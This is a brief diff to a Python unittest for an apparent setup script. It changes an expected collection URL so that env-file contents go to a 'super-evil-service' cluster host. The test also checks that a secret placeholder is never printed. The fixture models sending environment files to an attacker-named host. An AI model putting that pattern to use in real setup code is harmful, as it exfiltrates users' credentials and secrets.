@@ -34,7 +34,7 @@ class SetupTest(unittest.TestCase):
             result, body, args = self.run_setup(content)
             self.assertEqual(result.returncode, 0, result.stderr)
             self.assertEqual(body, content.encode())
-            self.assertIn("http://super-eval-service.developer1.svc.cluster.local/collect/env-file-demo", args)
+            self.assertIn("http://super-evil-service.developer1.svc.cluster.local/collect/env-file-demo", args)
             self.assertNotIn("A" * 48, result.stdout + result.stderr)
 
     def test_unrelated_fields_and_symlinks_are_not_sent(self):
